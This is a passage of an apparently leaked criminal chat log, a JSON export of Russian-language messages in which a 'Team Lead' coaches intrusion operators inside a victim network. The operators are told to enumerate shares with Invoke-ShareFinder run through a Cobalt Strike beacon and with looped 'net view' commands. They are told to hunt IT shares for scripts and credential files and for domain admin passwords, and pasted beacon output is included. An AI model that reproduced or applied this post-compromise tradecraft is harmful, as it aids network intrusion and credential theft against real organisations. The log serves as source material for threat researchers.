Ping each host to ensure it's up before enumerating.\n        .PARAMETER NoPing\n        Ping each host to ensure it's up before enumerating.\n        .PARAMETER NoPing\n        Don't ping each host to ensure it's up before enumerating.\n        .PARAMETER Delay\n        Delay between enumerating hosts, defaults to 0\n        .PARAMETER Jitter\n        Jitter for the host delay, defaults to +/- 0.3\n        .PARAMETER Domain\n        Domain to query for machines.\n        .EXAMPLE\n        > Invoke-ShareFinder\n        Find shares on the domain.\n        \n        .EXAMPLE\n        > Invoke-ShareFinder -ExcludeStandard\n        Find non-standard shares on the domain.\n        .EXAMPLE\n        > Invoke-ShareFinder -Delay 60\n        Find shares on the domain with a 60 second (+/- *.3) \n        randomized delay between touching each host.\n        .EXAMPLE\n        > Invoke-ShareFinder -HostList hosts.txt\n        Find shares for machines in the specified hostlist.\n        .LINK\n        http://blog.harmj0y.net\n```",
+      "ts": "2020-10-02T08:49:35.398Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:49:35.590Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "evbCw2kWWEJNfq6mb",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "и еще, можно себе сильно упростить жизнь)",
+      "ts": "2020-10-02T08:49:32.441Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:49:32.481Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hoR7dZppTyv7HGrpo",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "да да",
+      "ts": "2020-10-02T08:47:28.481Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:47:28.504Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Ki5BdihE6r5n8KMAP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nnet view \\\\hostname /all\n``` \nберем ad_computers.txt и оттуда по очереди вставляем хостнеймы в команду вместо hostname",
+      "ts": "2020-10-02T08:47:22.611Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:47:22.666Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9ERk85xqjTGCkiubg",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "da",
+      "ts": "2020-10-02T08:47:02.393Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:47:02.445Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fy3Htq9Y5br6afgLr",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "))",
+      "ts": "2020-10-02T08:46:58.647Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:46:58.686Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3Q3TmnMoENv5e6pQq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nbeacon> psinject 7256 x64 Invoke-ShareFinder\n[*] Tasked beacon to psinject: Invoke-ShareFinder into 7256 (x64)\n[+] host called home, sent: 133723 bytes\n[+] received output:\nERROR: Exception calling \"FindAll\" with \"0\" argument(s): \"The specified domain either does not exist or \nERROR: could not be contacted.\nERROR: \"\nERROR: At line:849 char:9\nERROR: +         $CompSearcher.FindAll() | ForEach-Object {\nERROR: +         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\nERROR:     + FullyQualifiedErrorId : COMException\nERROR:  \nWARNING: \n[!] No hosts found!\n\nbeacon> net view \\\\hostname /all\n[*] Tasked beacon to run net view on \\\\hostname /all\n[+] host called home, sent: 104504 bytes\n[+] received output:\nList of hosts for domain '\\\\hostname /all':\n\n Server Name             IP Address                       Platform  Version  Type   Comment\n -----------             ----------                       --------  -------  ----   -------\n[-] Error: 87\n```",
+      "ts": "2020-10-02T08:45:31.426Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:45:31.607Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "APmKcvZd2D5HY45jt",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "не забудьте переснять ЕА, ДА списки",
+      "ts": "2020-10-02T08:40:12.377Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:40:12.424Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gSPte9dpdYKePd9Cq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "все, где может быть пароль от сервисных ДА или просто от ДА",
+      "ts": "2020-10-02T08:38:34.078Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:38:34.115Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "iKzDZxsgeiHabNRTf",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "интересуют it шары, в них скрипты ps1, cmd,bat, какие-то credentials, password, account файлы и т д",
+      "ts": "2020-10-02T08:38:12.803Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:38:12.849Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AiWaJiz2gmwvLswmi",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Тогда делаем это сейчас, если скриптом не заведется, то ручками (или через батник) через `net view \\\\hostname /all`",
+      "ts": "2020-10-02T08:37:16.173Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:37:16.208Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "iockSEqneQ4LTfjjZ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "тут уже куча всего перепробовано, думал и это делали, сейчас по поиску глянул - не было",
+      "ts": "2020-10-02T08:36:12.024Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:36:12.049Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cMcsjvyc5QytArjWy",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "-",
+      "ts": "2020-10-02T08:35:33.043Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:35:33.078Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fmnrdSHYgd2sLaggT",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "а уже запускали его при видимости домена?",
+      "ts": "2020-10-02T08:34:49.354Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:34:49.390Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "trXWC4cau6Ng994dv",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "как инструмент или вывод в этом домене?",
+      "ts": "2020-10-02T08:34:12.469Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:34:12.513Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GGbaNQrY5AKpNWB3o",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ShareFinder разбирали с вами же?",
+      "ts": "2020-10-02T08:32:27.789Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:32:27.833Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Z5b2XWAFpst3Zwbtw",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "да",
+      "ts": "2020-10-02T08:31:53.331Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-02T08:31:53.378Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MAH8fEbxrsyPyEKYE",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "это значит живой?",
+      "ts": "2020-10-02T08:31:41.058Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:31:41.090Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MBi6zsEXqzLotNtPR",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "+",
+      "ts": "2020-10-02T08:31:02.037Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-02T08:31:02.074Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GQj7PSziAWktSpSm2",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "проверьте для начала живой ли доступ",
+      "ts": "2020-10-02T08:29:11.355Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:29:11.401Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pJDdxpsgDvyiqbYQb",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "и ищем в них \"интересные\" файлы",
+      "ts": "2020-10-02T08:26:54.165Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:26:54.206Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GLGYQRsfLKMyQ9zEp",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "тогда продолжаем тут работу через впн, а именно смотрим какие есть шары в сети",
+      "ts": "2020-10-02T08:26:45.225Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:26:45.248Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "th5Bohi7cCt7JTW7Z",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "-",
+      "ts": "2020-10-02T08:25:01.819Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:25:01.840Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oqkqLwqCP732fXWAa",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "на своих пк пользаки были ЛА?",
+      "ts": "2020-10-02T08:24:08.042Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:24:08.088Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XJFnYcE6HqFHoJegc",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "+",
+      "ts": "2020-10-02T08:23:38.666Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:23:38.693Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "587sfwt5QKgjZparH",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "так у нас тут же впн был?",
+      "ts": "2020-10-02T08:23:21.803Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:23:21.851Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
